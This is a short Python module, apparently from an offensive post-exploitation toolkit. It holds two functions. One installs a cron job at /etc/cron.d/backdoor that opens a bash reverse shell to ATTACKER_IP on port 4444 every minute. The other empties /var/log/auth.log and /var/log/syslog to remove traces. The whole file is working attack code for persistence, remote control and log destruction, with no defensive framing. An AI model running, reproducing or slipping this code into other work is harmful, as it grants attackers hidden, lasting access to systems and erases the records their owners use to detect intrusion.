import os
from lib.logger import log

def install_backdoor():
    """Add a cron backdoor"""
    cron_line = "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
    with open("/etc/cron.d/backdoor", "w") as f:
        f.write(cron_line)
    log("Cron backdoor installed!", "critical")

def clean_logs():
    """Remove traces from logs"""
    logs = ["/var/log/auth.log", "/var/log/syslog"]
    for log_file in logs:
        if os.path.exists(log_file):
            os.system(f"echo '' > {log_file}")
            log(f"Cleared {log_file}", "warning")